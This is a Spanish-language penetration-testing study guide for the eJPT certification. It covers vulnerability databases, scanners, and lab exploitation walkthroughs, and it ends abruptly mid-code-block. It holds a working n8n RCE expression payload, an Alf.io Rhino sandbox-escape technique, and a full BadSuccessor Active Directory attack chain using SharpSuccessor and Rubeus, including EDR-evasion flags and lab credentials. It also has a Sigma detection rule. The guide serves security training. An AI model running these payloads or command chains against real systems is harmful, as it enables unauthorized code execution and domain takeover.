@@ -1,0 +1,439 @@
+# 🛡️ GUÍA COMPLETA DE VULNERABILIDADES, ESCANEO Y EXPLOTACIÓN DE CVEs
+### *Manual de Referencia Técnica y Explotación – Certificación eJPT y Pruebas de Penetración*
+
+---
+
+> **Estructura del Manual:** Organizado exactamente según la cronología oficial de los documentos cargados en la libreta. Cada sección principal corresponde a una fuente y contiene explicaciones conceptuales exhaustivas, vectores de ataque, desgloses técnicos paso a paso, ejemplos prácticos de laboratorio, técnicas de elusión (*bypasses*), comandos y métodos de remediación. Redactado íntegramente en texto narrativo continuo sin listas de viñetas para facilitar la lectura fluida y la consulta directa durante exámenes y auditorías.
+
+---
+
+## 🚀 Matriz de Consulta Rápida (Cheat Sheet de Consulta Expresa)
+
+| Tema / Vulnerabilidad | Vector / Subsistema | Comando / Payload Clave | Indicador de Éxito / Impacto |
+| :--- | :--- | :--- | :--- |
+| **Bases de Datos VDB** | NVD, CVE List, Exploit-DB | Búsqueda por ID CVE / `searchsploit CVE-YYYY-NNNN` | Obtención de CVSS v4, asignación CPE/CWE y PoC verificados. |
+| **Escaneo con Nmap** | Puertos TCP/UDP, Servicios | `nmap -sV -sC -p- -oN scan.txt TARGET_IP` | Inventario completo de servicios, versiones y firmas NSE. |
+| **Escaneo con Nikto** | Servidor Web HTTP/S | `nikto -h http://TARGET_IP:PORT` | Detección de cabeceras ausentes, phpinfo(), indexación y RFI. |
+| **Escaneo con OpenVAS** | Host y Aplicación Web | Interfaz Web `http://127.0.0.1:9392` (admin:admin) | Informe detallado de hallazgos clasificados por severidad y CVE. |
+| **NoScope (RCE)** | Alf.io / Mozilla Rhino | Inyección de variable `returnClass` $\rightarrow$ `Class.forName()` | Bypass de lista negra y ejecución de comandos con `Runtime.exec()`. |
+| **n8n CVE-2025-68613** | Evaluador de Expresiones | `{{ ((function(){ return this.process.mainModule.require('child_process').execSync('id').toString(); })()) }}` | RCE en Node.js con privilegios del proceso de la aplicación n8n. |
+| **AD BadSuccessor** | Active Directory dMSA | `SharpSuccessor.exe` / `bloodyAD add badSuccessor` | Creación de objeto dMSA para suplantar al Admin de Dominio y DCSync. |
+| **CVE-2026-46300 Fragnesia** | Linux Kernel xfrm ESP-in-TCP | `./fragnesia` $\rightarrow$ Escritura de 1 byte en caché de `/usr/bin/su` | Elevación de privilegios local a `root` del host al ejecutar `su`. |
+| **CVE-2026-42945 Nginx Rift** | Nginx `ngx_http_rewrite` | `python3 poc.py --target http://127.0.0.1:19321 --shell` | Desbordamiento de montón en trabajador Nginx y RCE como `root`. |
+
+---
+
+## 1. Entendiendo las Bases de Datos de Vulnerabilidades
+
+### 1.1. Introducción y Propósito de las Bases de Datos de Vulnerabilidades
+Las bases de datos de vulnerabilidades son repositorios centralizados encargados de recopilar, organizar, estandarizar y publicar información técnica sobre fallos de seguridad conocidos en componentes de software y hardware. En lugar de que cada organización o analista tenga que investigar y nombrar de manera independiente cada defecto descubierto, estas bases de datos proporcionan una fuente única de verdad compartida para toda la comunidad de ciberseguridad.
+
+Su propósito fundamental es catalogar qué es la vulnerabilidad, qué productos y versiones específicas se ven afectados, cuál es el nivel de gravedad técnica y dónde se pueden localizar parches de seguridad, avisos de proveedores o pruebas de concepto. Al estandarizar esta información, las bases de datos de vulnerabilidades permiten a los equipos de seguridad y a los programas automatizados realizar una gestión eficiente de riesgos, priorizar la aplicación de parches y coordinar la remediación a escala global.
+
+### 1.2. Bloques de Construcción Fundamentales (CVE, CVSS, CPE, CWE y CNA)
+Para que la información sobre fallos de seguridad sea procesable de forma consistente entre diferentes herramientas e informes, las bases de datos utilizan un conjunto de bloques de construcción estandarizados.
+
+El identificador de vulnerabilidad asigna un código único a cada problema conocido. El estándar más extendido es el sistema de Vulnerabilidades y Exposiciones Comunes (CVE), administrado por MITRE. Un código como CVE-2021-44228 identifica unívocamente la vulnerabilidad Log4Shell, garantizando que escáneres, bases de datos e informes ejecutivos hablen exactamente del mismo fallo sin ambigüedades.
+
+La gravedad se mide mediante el Sistema de Puntuación de Vulnerabilidades Comunes (CVSS). CVSS asigna una puntuación numérica que oscila entre 0,0 y 10,0 basada en métricas como el vector de ataque (si es remoto por red o requiere acceso local), la complejidad, la necesidad de autenticación o interacción del usuario, y el impacto sobre la confidencialidad, la integridad y la disponibilidad del sistema. Una puntuación CVSS superior a 9,0 indica una severidad crítica que exige atención prioritaria.
+
+Los productos afectados se identifican mediante la Enumeración Común de Plataformas (CPE). CPE proporciona un formato de cadena estructurada que especifica el proveedor, el nombre del producto y la versión exacta afectada. En lugar de descripciones ambiguas como Apache afectado, una entrada CPE define con precisión si la vulnerabilidad aplica a Apache HTTP Server versión 2.4.29.
+
+La causa raíz del fallo se clasifica mediante la Enumeración Común de Debilidades (CWE). CWE categoriza los errores subyacentes en el diseño o en el código del software. Por ejemplo, CWE-89 identifica vulnerabilidades de Inyección SQL, mientras que CWE-94 identifica fallos de Inyección de Código, permitiendo a los desarrolladores comprender la naturaleza del error de programación independientemente del producto afectado.
+
+Las Autoridades de Numeración CVE (CNA) son organizaciones autorizadas para asignar identificadores CVE a vulnerabilidades recién descubiertas. Las CNA incluyen grandes proveedores de tecnología como Microsoft, Google o GitHub, así como equipos de respuesta ante incidentes (CERT), lo que permite escalar la asignación de códigos directamente desde los creadores del software.
+
+### 1.3. Metadatos de Vulnerabilidad y Diferencia entre Severidad y Riesgo
+Cada registro en una base de datos contiene metadatos esenciales, como una descripción técnica detallada del problema, fechas de publicación y modificación, enlaces a avisos del fabricante y recomendaciones de mitigación.
+
+Es crucial distinguir entre Severidad y Riesgo. La severidad (medida por CVSS) refleja el impacto técnico intrínseco de la vulnerabilidad en un entorno ideal. El riesgo representa la probabilidad y el impacto real que esa vulnerabilidad tiene en la infraestructura específica de una organización. Una vulnerabilidad de severidad crítica en un servidor aislado de pruebas sin acceso a Internet representa un riesgo muy bajo, mientras que una vulnerabilidad de severidad media en un servidor web de producción orientado al público representa un riesgo considerablemente superior.
+
+### 1.4. Catálogo de Vulnerabilidades CVE (CVE List)
+La Lista CVE es un catálogo público mantenido por la organización MITRE que actúa como el registro primario de identificación de vulnerabilidades. La función de MITRE se limita a asignar el identificador único y mantener la descripción oficial y las referencias cruzadas proporcionadas por las CNA. MITRE no realiza análisis profundos de gravedad ni genera evaluaciones de impacto.
+
+Al consultar una entrada en el portal oficial cve.org, se obtienen las fechas de asignación y actualización, la descripción del fallo, los códigos CWE asociados, las referencias externas y la lista de versiones notificadas por la autoridad de asignación.
+
+### 1.5. Base de Datos Nacional de Vulnerabilidades (NVD)
+La Base de Datos Nacional de Vulnerabilidades (NVD) es gestionada por el Instituto Nacional de Estándares y Tecnología (NIST) de los Estados Unidos. La NVD toma las entradas crudas de la Lista CVE y las enriquece con análisis técnicos independientes.
+
+El enriquecimiento de la NVD incluye el cálculo y desglose del vector CVSS, la vinculación estructurada de cadenas CPE para cada versión de software afectada y la categorización formal de causas raíz CWE. Debido a esta estructuración exhaustiva, la mayoría de los escáneres de seguridad corporativos y herramientas de gestión de parches utilizan la NVD como su fuente de datos primaria para priorizar vulnerabilidades.
+
+### 1.6. Otras Bases de Datos Públicas y Centradas en Exploit (Exploit-DB y Avisos de Proveedores)
+Además de los catálogos oficiales, existen bases de datos especializadas orientadas a la explotación práctica. Exploit-DB es un repositorio centrado en pruebas de concepto (PoC) y código de explotación funcional. Cada entrada en Exploit-DB asigna un identificador EDB-ID y vincula directamente el código ejecutable (en Python, C, Ruby o scripts de shell) necesario para verificar la vulnerabilidad, indicando mediante un icono de verificación si el exploit ha sido probado con éxito por sus administradores.
+
+Los repositorios públicos como GitHub son fuentes de divulgación extremadamente rápidas. Tras la publicación de un CVE de alto impacto, es habitual que investigadores independientes publiquen scripts de explotación en GitHub en cuestión de horas, incluso antes de que los análisis formales aparezcan en la NVD o en Exploit-DB. Asimismo, los avisos de seguridad publicados directamente por fabricantes como Microsoft, Cisco o Red Hat proporcionan la información más autorizada sobre parches oficiales y soluciones temporales de configuración.
+
+---
+
+## 2. Herramientas de Escaneo de Vulnerabilidades
+
+### 2.1. Introducción y Terminología Esencial
+El escaneo de vulnerabilidades es un proceso automatizado diseñado para examinar sistemas, redes y aplicaciones en busca de debilidades de seguridad, versiones de software obsoletas y configuraciones erróneas. Constituye una actividad fundamental en las fases iniciales de una evaluación de seguridad o prueba de penetración.
+
+Entre los términos clave se incluyen la vulnerabilidad (defecto explotable en código o arquitectura), el fallo de configuración (ajuste inseguro como contraseñas predeterminadas o permisos excesivamente abiertos), el CVE (identificador único del problema) y la puntuación CVSS (indicador numérico de gravedad).
+
+### 2.2. Tipos de Escáneres de Vulnerabilidades
+Los escáneres de red examinan los dispositivos conectados a una infraestructura para descubrir puertos TCP/UDP abiertos, identificar servicios en ejecución y detectar puntos de entrada expuestos a nivel de red.
+
+Los escáneres de aplicaciones web se especializan en la capa HTTP/HTTPS, analizando sitios web, APIs y servicios web en busca de componentes desactualizados, fallos de inyección, encabezados de seguridad faltantes y problemas en la gestión de sesiones.
+
+Los escáneres basados en host se ejecutan directamente con privilegios dentro del sistema operativo objetivo, inspeccionando el estado interno del sistema, parches faltantes, software instalado no autorizado, permisos de archivos y configuraciones del registro o del núcleo.
+
+### 2.3. Escaneo de Red con Nmap
+Network Mapper (Nmap) es la herramienta estándar para el descubrimiento de hosts y la exploración de servicios en red.
+
+El descubrimiento de hosts se realiza mediante el comando `nmap -sn TARGET_IP`, el cual verifica si la máquina objetivo está activa en la red sin realizar un escaneo de puertos.
+
+Para realizar una detección completa de servicios y versiones en todos los puertos TCP, se utiliza el comando `nmap -sV -sC -p- -oN scan_results.txt TARGET_IP`. El parámetro `-sV` habilita la detección de versiones de software, `-sC` ejecuta el conjunto de scripts predeterminados del motor NSE, `-p-` examina la totalidad de los 65.535 puertos TCP y `-oN` guarda el resultado en un archivo de texto plano.
+
+El escaneo agresivo se ejecuta con `nmap -A TARGET_IP`, integrando en una sola ejecución la detección de sistema operativo, la inspección de versiones, la ejecución de scripts avanzados y la trazabilidad de rutas (traceroute).
+
+El motor de scripts de Nmap (NSE) permite realizar auditorías de vulnerabilidades ligeras escritas en lenguaje Lua. Por ejemplo, la ejecución de `nmap --script ftp-anon -p 21 TARGET_IP` comprueba si el servicio FTP permite el inicio de sesión anónimo con el usuario `anonymous` sin contraseña, reportando si se concede acceso no autenticado al sistema de archivos.
+
+### 2.4. Escáner de Servidores Web Nikto
+Nikto es un escáner especializado en la evaluación de servidores web que examina miles de problemas conocidos, incluidos archivos peligrosos predeterminados, programas CGI obsoletos, errores de configuración del servidor y fuga de información.
+
+La ejecución básica contra una aplicación web en un puerto específico se realiza con el comando `nikto -h http://TARGET_IP:8080`.
+
+Los resultados típicos de Nikto revelan hallazgos de alto valor operativo. La divulgación del banner del servidor (por ejemplo, `Server: Apache/2.4.58`) permite identificar vulnerabilidades específicas de la versión del servidor web. La ausencia de la bandera `HttpOnly` en las cookies de sesión (como `PHPSESSID`) expone a la aplicación al robo de cookies mediante ataques XSS. La falta del encabezado `X-Frame-Options` permite que el sitio sea incrustado en iframes maliciosos para realizar ataques de Clickjacking. La presencia de métodos HTTP peligrosos como `DEBUG` o `TRACE` puede filtrar información interna de depuración. El descubrimiento de páginas de diagnóstico como `/info.php` (que ejecuta `phpinfo()`) expone variables de entorno, rutas internas y configuraciones del servidor. La indexación de directorios habilitada (como en `/static/`) permite a cualquier usuario listar y descargar archivos no enlazados públicamente. La detección de parámetros vulnerables a Inclusión Remota de Archivos (RFI) en URLs permite a un atacante ejecutar código alojado en un servidor externo.
+
+### 2.5. Gestión de Vulnerabilidades con OpenVAS y Greenbone
+Greenbone Vulnerability Management (GVM) / OpenVAS es un marco de trabajo de escaneo de vulnerabilidades de nivel empresarial que realiza evaluaciones profundas tanto a nivel de host como de red.
+
+El servicio web del asistente de Greenbone se ejecuta habitualmente en el puerto local `http://127.0.0.1:9392` y requiere autenticación inicial con las credenciales administrativas.
+
+El flujo de trabajo operativo consta de tres pasos principales. En primer lugar, la definición del objetivo se realiza accediendo a la sección de Configuración, creando un nuevo registro Target e ingresando la dirección IP de la máquina a auditar. En segundo lugar, la creación de la tarea se efectúa en el menú de Escaneos, asignando un nombre a la tarea, vinculando el Target creado y seleccionando el perfil de escaneo (como *Full and Fast*). Finalmente, al ejecutar la tarea, OpenVAS lanza miles de pruebas automatizadas (NVTs) y genera un informe consolidado que mapea cada hallazgo con sus respectivos códigos CVE, puntuaciones CVSS y recomendaciones de remediación.
+
+---
+
+## 3. Técnicas Básicas de Identificación de Vulnerabilidades
+
+### 3.1. Introducción al Mapeo de la Superficie de Ataque
+La superficie de ataque de un entorno representa la suma total de todos los puntos donde un atacante no autorizado puede intentar interactuar con los sistemas para introducir datos, extraer información o ejecutar comandos.
+
+A nivel de red, la superficie está compuesta por cada puerto TCP/UDP abierto y cada protocolo de comunicación activo. A nivel de sistema operativo, incluye las cuentas de usuario locales, servicios en segundo plano, tareas programadas y permisos del sistema de archivos. A nivel de aplicación, abarca todos los puntos de entrada que aceptan datos del usuario, como parámetros URL, formularios HTML, encabezados HTTP, cookies y scripts de API.
+
+Es fundamental diferenciar la superficie de ataque externa (alcanzable desde Internet, como servidores web o puertas de enlace VPN) de la superficie de ataque interna (accesible tras obtener acceso a la red corporativa, como controladores de dominio o recursos compartidos SMB). El mapeo previo de la superficie de ataque permite dirigir los esfuerzos hacia los componentes más expuestos y menos protegidos.
+
+### 3.2. Enumeración de Servicios y Captura de Banderas (Banner Grabbing)
+La enumeración de servicios busca determinar con precisión qué programa y qué versión exacta están respondiendo detrás de un puerto abierto. Confiar únicamente en el número de puerto predeterminado es un error, ya que un servicio SSH puede configurarse en el puerto 80 o un servidor web en el puerto 2222.
+
+La captura de banners consiste en conectarse directamente a un puerto mediante utilidades como `netcat` o `telnet` y leer la cadena inicial emitida por el servicio. Por ejemplo, al ejecutar `nc -vn TARGET_IP 22`, el servidor suele responder con una cadena como `SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3`, revelando no solo la versión exacta de OpenSSH sino también la distribución del sistema operativo subyacente.
+
+Cuando un servicio suprime su banner o devuelve una cadena modificada, Nmap utiliza técnicas de toma de huellas dactilares (fingerprinting), enviando paquetes especialmente estructurados y comparando las respuestas de los sockets contra su base de datos de firmas conocidas.
+
+Con la información recolectada se construye un inventario de servicios, registrando en una estructura organizada el puerto, el protocolo, el nombre del servicio, la versión del software y notas técnicas relevantes.
+
+### 3.3. Emparejamiento de Servicios con Exploits Conocidos
+Una vez completado el inventario de servicios, se realiza el cruce de datos con bases de datos públicas para identificar exploits aplicables.
+
+La búsqueda local se ejecuta en la terminal mediante la herramienta `searchsploit`. Por ejemplo, `searchsploit OpenSSH 7.6p1` o `searchsploit Apache 2.4.29` filtra el repositorio local de Exploit-DB y muestra la ruta exacta de los scripts de explotación disponibles en el sistema.
+
+También se consultan repositorios en GitHub buscando el identificador CVE específico (por ejemplo, `CVE-2021-41773 PoC`) para localizar código de prueba de concepto publicado por la comunidad de investigadores.
+
+Es crítico evaluar la brecha entre que un sistema sea teóricamente vulnerable y técnicamente explotable. Un servicio puede reportar una versión antigua vulnerada, pero si el administrador aplicó un parche de seguridad adaptado (*backporting*) sin cambiar el número de versión, o si la vulnerabilidad requiere un módulo opcional que está deshabilitado en la configuración, el exploit fallará. La confirmación real ocurre únicamente durante la fase de explotación.
+
+### 3.4. Identificación de Vulnerabilidades en Aplicaciones Web
+La evaluación de aplicaciones web requiere examinar cómo procesa el servidor las solicitudes HTTP y cómo reacciona ante entradas manipuladas.
+
+El establecimiento de una línea de base consiste en navegar por la aplicación utilizando la interfaz web normalmente, observando las respuestas legítimas, los formularios, los flujos de autenticación y las URLs. Se utiliza el Proxy de Burp Suite para capturar y estructurar todo el tráfico en el mapa del sitio (*Site Map*).
+
+Los puntos de inyección se identifican enviando caracteres especiales como la comilla simple (`'`), comillas dobles (`"`), símbolos de porcentaje (`%`) o delimitadores en parámetros URL y campos de entrada. Si al enviar `https://sitio.thm/perfil?id=1'` la aplicación devuelve un error de sintaxis del motor de base de datos MySQL o PostgreSQL en la pantalla, se confirma que la entrada del usuario se concatena directamente en la consulta SQL sin saneamiento ni parametrización.
+
+Las debilidades en el control de acceso se detectan modificando identificadores directos. En una vulnerabilidad de Referencia Directa Insegura a Objetos (IDOR), si un usuario autenticado accede a su perfil en `/perfil.php?id=105` y al cambiar manualmente el parámetro a `/perfil.php?id=106` la aplicación muestra la información privada de otro usuario, existe una falla crítica de autorización a nivel de objeto.
+
+La divulgación de información se identifica analizando las cabeceras HTTP de respuesta, comentarios en el código fuente HTML, archivos `/robots.txt`, archivos de versión de control como `/.git/` y mensajes de error detallados (*stack traces*) que expongan rutas absolutas del servidor o credenciales de la base de datos.
+
+### 3.5. Identificación de Vulnerabilidades en Sistemas y Redes
+Los servicios de red e infraestructuras locales presentan configuraciones erróneas recurrentes que deben ser auditadas.
+
+Las credenciales predeterminadas y débiles se verifican en paneles de administración web, servicios SSH, bases de datos y dispositivos de red probando combinaciones comunes de usuario y clave (como `admin:admin`, `root:root`, `user:user`).
+
+En el servicio de compartición de archivos Server Message Block (SMB) de Windows, se prueba el acceso por sesión nula con el comando `smbclient -L //TARGET_IP -N`. Si el servidor acepta la conexión no autenticada y enumera los recursos compartidos, se procede a verificar si existen recursos con permisos de lectura o escritura accesibles sin clave. Asimismo, se comprueba si la firma de SMB es opcional o no está requerida; si no se exige la firma de mensajes, el servicio es vulnerable a ataques de retransmisión SMB (*SMB Relay*).
+
+En el servicio FTP, se audita el acceso anónimo intentando iniciar sesión con la cuenta `anonymous` y cualquier contraseña. Si el servidor acepta la conexión, se examinan los directorios en busca de copias de seguridad, claves privadas SSH o archivos de configuración expuestos.
+
+### 3.6. Triaje, Priorización y Documentación de Hallazgos
+El triaje es el proceso de analizar los hallazgos descubiertos, evaluar su impacto real en el contexto del objetivo y organizarlos en un orden lógico de ejecución.
+
+Los hallazgos se clasifican en tres niveles de prioridad. El Nivel 1 comprende vulnerabilidades de alto impacto y fácil ejecución que conceden acceso directo al sistema o escalada administrativa inmediata, como ejecución remota de código no autenticada (RCE), credenciales predeterminadas en servicios críticos o bypasses de autenticación. El Nivel 2 incluye hallazgos que requieren más trabajo técnico o condiciones específicas para ser explotados, como inyecciones SQL ciegas, vulnerabilidades IDOR o servicios desactualizados con exploits complejos. El Nivel 3 abarca hallazgos de bajo impacto o informativos, como divulgación de versiones en cabeceras o falta de banderas de seguridad secundarias, los cuales ayudan a enriquecer la evaluación pero no proporcionan acceso por sí solos.
+
+La documentación exige registrar de forma precisa cada hallazgo, incluyendo la dirección IP y puerto del host afectado, la descripción técnica de la vulnerabilidad, la evidencia exacta (peticiones y respuestas HTTP capturadas en Burp Suite) y los pasos reproducibles para verificar el problema.
+
+---
+
+## 4. NoScope: Buscando Ejecución Remota de Código (RCE)
+
+### 4.1. Análisis Vulnerable de Alf.io (CVE-2026-35482)
+Alf.io es una plataforma de gestión de eventos y venta de entradas de código abierto desarrollada en Java sobre el marco de trabajo Spring Boot. La plataforma incluye un sistema de extensiones que permite a los administradores ejecutar scripts personalizados en lenguaje JavaScript para automatizar tareas como la emisión de facturas o la asignación de tickets.
+
+Para evitar que los scripts de JavaScript accedan a la Máquina Virtual de Java (JVM) subyacente y ejecuten comandos en el servidor, Alf.io utiliza un entorno aislado (*sandbox*) basado en el motor Mozilla Rhino. El motor valida el código del script contra una lista de bloqueo (*blacklist*) antes de ejecutarlo, rechazando cualquier intento de nombrar clases peligrosas como `java.lang.Runtime` o utilizar palabras clave asociadas a la reflexión de Java. La suposición del diseño era que si un script no puede escribir el nombre de una clase restringida, jamás podrá invocar sus métodos.
+
+La vulnerabilidad CVE-2026-35482 rompe por completo esa suposición. El sistema inyecta automáticamente una variable llamada `returnClass` dentro del contexto de ejecución de cada script de usuario. Esta variable es un objeto nativo de tipo `Class` de Java destinado a facilitar la declaración del tipo de retorno del script.
+
+### 4.2. Mecánica de la Evasión del Sandbox de JavaScript
+Dado que `returnClass` es una instancia directa del objeto `java.lang.Class`, expone el método público `Class.forName()`. Este método permite cargar dinámicamente cualquier clase presente en el entorno de ejecución de la JVM pasando el nombre de la clase como una cadena de texto como argumento.
+
+Debido a que el nombre de la clase peligrosa se pasa como un argumento en una cadena de texto dentro del método `forName()`, la lista de bloqueo del motor de filtrado no detecta la llamada como una instrucción peligrosa directa.
+
+El payload de evasión utiliza la variable inyectada para cargar la clase `java.lang.Runtime` mediante la sintaxis `returnClass.forName('java.lang.Runtime')`. Una vez obtenida la referencia a la clase, se utiliza la reflexión de Java para acceder al método estático `getRuntime()` e invocar el método `.exec()`, permitiendo a un atacante ejecutar cualquier comando a nivel del sistema operativo con los privilegios del proceso de la aplicación Java.
+
+### 4.3. Filosofía y Funcionamiento de NoScope
+CVE-2026-35482 fue descubierto de manera totalmente autónoma por NoScope, una plataforma de pruebas de penetración automatizadas basada en Inteligencia Artificial.
+
+NoScope opera desplegando agentes especializados que mapean de forma continua la superficie de ataque de una aplicación, construyen un gráfico dinámico de vectores de ataque, sintetizan cargas útiles específicas adaptadas al contexto y validan la explotabilidad completa de extremo a extremo antes de emitir cualquier alerta. Ningún hallazgo es reportado a menos que haya sido confirmado mediante la ejecución práctica del exploit.
+
+---
+
+## 5. n8n: CVE-2025-68613
+
+### 5.1. Introducción y Contexto de la Plataforma n8n
+n8n es una plataforma popular de automatización de flujos de trabajo de código abierto construida sobre Node.js. Permite conectar aplicaciones, APIs y servicios mediante un diseñador visual basado en nodos. Se utiliza frecuentemente para integrar servicios en la nube, automatizar procesos de negocio y orquestar herramientas de ciberseguridad.
+
+Las versiones de n8n comprendidas entre la 0.211.0 y la 1.120.3 contienen una vulnerabilidad crítica de Ejecución Remota de Código (RCE) catalogada como CVE-2025-68613, con una puntuación de gravedad CVSS v3.1 de 9,9.
+
+La vulnerabilidad radica en el sistema de evaluación de expresiones de los flujos de trabajo, permitiendo a cualquier usuario autenticado en la plataforma ejecutar comandos arbitrarios en el sistema operativo del servidor hosting con los mismos privilegios del proceso de n8n.
+
+### 5.2. Arquitectura Técnica e Inyección de Expresiones
+n8n permite a los usuarios escribir expresiones dinámicas dentro de los nodos del flujo de trabajo delimitando el código entre dobles llaves `{{ }}`. Estas expresiones son evaluadas por la aplicación en tiempo de ejecución para procesar datos de entrada y salida.
+
+El evaluador de expresiones procesa el código JavaScript suministrado por el usuario dentro de un entorno que carece de un aislamiento contextual adecuado. Un atacante puede construir una función anónima autoejecutable dentro de la expresión para escapar del sandbox y acceder a los objetos globales del entorno Node.js.
+
+El payload de explotación utiliza la sintaxis de dobles llaves para envolver la siguiente llamada JavaScript:
+```javascript
+{{ ((function(){ return this.process.mainModule.require('child_process').execSync('id').toString(); })()) }}
+```
+
+El análisis técnico de este payload revela la cadena de escalada de contexto. El objeto `this` dentro de la función evaluada hace referencia al objeto global de Node.js. La propiedad `this.process` da acceso al proceso del sistema. La propiedad `mainModule` hace referencia al módulo raíz de la aplicación n8n. Utilizando la función de carga de módulos `require('child_process')`, el atacante importa el módulo nativo de Node.js encargado de la ejecución de comandos. Finalmente, la llamada `.execSync('id')` ejecuta el comando del sistema operativo en el servidor host y `.toString()` convierte el búfer de respuesta en texto legible.
+
+### 5.3. Explotación Práctica en la Interfaz Web
+Para explotar esta vulnerabilidad desde la interfaz web de n8n, se siguen estos pasos operativos.
+
+En primer lugar, se inicia sesión en la plataforma n8n y se crea un nuevo flujo de trabajo seleccionando la opción de empezar desde cero. En segundo lugar, se añade como primer paso el nodo desencadenador de activación manual (*Manual Trigger*). En tercer lugar, se conecta a continuación un nodo de edición de campos de tipo *Edit Fields (Set)*. En cuarto lugar, dentro de la configuración del nodo *Set*, se añade un nuevo campo asignando un nombre arbitrario (como `resultado`) y se pega la cadena del payload de inyección en el campo de valor. Finalmente, al pulsar el botón de ejecutar paso (*Execute step*), n8n evalúa la expresión, ejecuta el comando `id` en el servidor backend y muestra la salida con el UID, GID y grupos del sistema en la vista previa del resultado.
+
+### 5.4. Estrategias de Detección, Reglas Sigma y Monitoreo Proxy
+Dado que n8n no genera registros de auditoría detallados de la evaluación interna de expresiones por defecto, la detección efectiva requiere implementar un proxy inverso (como Nginx) posicionado frente a la aplicación para registrar el cuerpo entero de las solicitudes HTTP entrantes (`$request_body`).
+
+La regla de detección en formato Sigma analiza los registros web en busca de peticiones HTTP POST dirigidas a la ruta de la API `/rest/workflows` que contengan en su cuerpo las cadenas asociadas a la escalada de contexto:
+```yaml
+title: Detección de Inyección de Expresiones RCE en n8n (CVE-2025-68613)
+status: experimental
+description: Detecta intentos de explotación de RCE en n8n mediante expresiones maliciosas en solicitudes de flujo de trabajo.
+logsource:
+  category: webserver
+detection:
+  selection:
+    http_method: 'POST'
+    uri_path|contains: '/rest/workflows'
+    body|contains|all:
+      - 'process.mainModule.require'
+      - 'child_process'
+  condition: selection
+falsepositives:
+  - Ninguno conocido en operaciones normales de n8n.
+level: critical
+```
+
+Adicionalmente, se deben monitorear los eventos de creación de procesos secundarios generados por el proceso padre de Node.js en el sistema operativo, alertando sobre la ejecución de shells como `/bin/sh`, `/bin/bash` o comandos de reconocimiento del sistema. La vulnerabilidad ha sido corregida oficialmente en las versiones 1.120.4, 1.121.1 y 1.122.0.
+
+---
+
+## 6. Active Directory: BadSuccessor
+
+### 6.1. Introducción a BadSuccessor y Cuentas dMSA
+BadSuccessor es una vulnerabilidad crítica de escalada de privilegios en entornos Microsoft Active Directory (AD) descubierta por Yuval Gordon de Akamai. Permite a un usuario con permisos limitados sobre una Unidad Organizativa (OU) suceder o imitar a cualquier cuenta del dominio, incluido el Administrador de Dominio, logrando el control total de la infraestructura.
+
+Active Directory cuenta con varios tipos de cuentas de servicio. Las Cuentas de Servicio Administrado independientes (sMSA, introducidas en Windows Server 2008 R2) están diseñadas para un solo equipo. Las Cuentas de Servicio Administrado en Grupo (gMSA, introducidas en Windows Server 2012) se ejecutan en múltiples servidores bajo la gestión automática de contraseñas de AD. Las Cuentas de Servicio Administrado Delegado (dMSA, introducidas en Windows Server 2025) permiten migrar cuentas de servicio heredadas a cuentas de máquina administradas en servidores específicos.
+
+El ataque BadSuccessor abusa del diseño de las cuentas dMSA. Si un usuario atacante tiene permisos para crear un objeto dMSA en una OU o gana control sobre un objeto dMSA existente, puede manipular sus atributos para simular una migración exitosa de la cuenta del Administrador de Dominio, permitiéndole solicitar tickets de Kerberos con la identidad del administrador.
+
+### 6.2. Reconocimiento de Permisos en la Unidad Organizativa
+El reconocimiento se inicia desde la cuenta del usuario sin privilegios `tbyte` (con contraseña `P@SSw0rd345`) en el dominio `tryhackme.local`. Se establece una conexión de escritorio remoto (RDP) mediante Remmina hacia el servidor de Windows (`10.211.101.20`).
+
+Desde la consola de PowerShell, se ejecuta el script de auditoría `Get-BadSuccessorOUPermissions.ps1` ubicado en la carpeta `C:\PoC`. El script examina los Listas de Control de Acceso (ACL) de Active Directory buscando cuentas que posean permisos de creación de objetos secundarios como `dSA: CREATE_CHILD` sobre alguna Unidad Organizativa. La salida del script confirma que la cuenta `tbyte` tiene permisos de escritura y creación sobre la Unidad Organizativa llamada `LabOU`.
+
+### 6.3. Explotación en Windows con SharpSuccessor y Rubeus
+La explotación manual en entornos Windows se simplifica utilizando la herramienta compilada `SharpSuccessor.exe` junto con `Rubeus.exe`.
+
+En primer lugar, se crea el objeto dMSA malicioso abusando de los permisos en la OU ejecutando el siguiente comando en PowerShell:
+```powershell
+.\SharpSuccessor.exe /path:"OU=LabOU,DC=tryhackme,DC=local" /account:tbyte /name:pentest_dmsa$ /impersonate:Administrator
+```
+
+En segundo lugar, se solicita un Ticket Granting Ticket (TGT) del usuario actual mediante delegación sin restricciones utilizando Rubeus:
+```powershell
+.\Rubeus.exe tgtdeleg /nowrap
+```
+
+En tercer lugar, utilizando la cadena del TGT codificada en Base64 obtenida en el paso anterior, se solicita un Ticket Granting Service (TGS) haciendo pasar la petición como la cuenta dMSA creada (`pentest_dmsa$`) dirigida al servicio Kerberos:
+```powershell
+.\Rubeus.exe asktgs /targetuser:pentest_dmsa$ /service:krbtgt/tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIFvjC...
+```
+El parámetro `/opsec` deshabilita la reutilización de tickets y el cifrado RC4 para evitar alertas en soluciones EDR, mientras que `/ptt` (*Pass-The-Ticket*) inyecta el ticket resultante directamente en la memoria de la sesión actual.
+
+En cuarto lugar, con el ticket inyectado en memoria, se solicita un ticket de servicio con contexto de administrador para el servicio CIFS del Controlador de Dominio:
+```powershell
+.\Rubeus.exe asktgs /user:pentest_dmsa$ /service:cifs/DC-LAB2025-01.tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIGLjCCB...
+```
+
+Finalmente, al intentar acceder al recurso compartido del Administrador de Dominio mediante PowerShell (`dir \\DC-LAB2025-01\c$\Users\Administrator\Desktop`), se confirma el acceso total de lectura y escritura al escritorio del administrador.
+
+### 6.4. Explotación en Linux con bloodyAD e Impacket
+La misma cadena de ataque se puede ejecutar desde una máquina atacante Linux (como Kali o AttackBox) utilizando `bloodyAD` y las utilidades del paquete `Impacket`.
+
+En primer lugar, se verifica el nombre de dominio y la dirección IP del Controlador de Dominio en el archivo `/etc/hosts`.
+
+En segundo lugar, se confirman los permisos de escritura del usuario `tbyte` utilizando `bloodyAD`:
+```bash
+bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local get writable --detail
+```
+
+En tercer lugar, se ejecuta el ataque BadSuccessor para crear el objeto dMSA llamado `pentest2_dmsa$` suplantando la cuenta administrativa:
+```bash
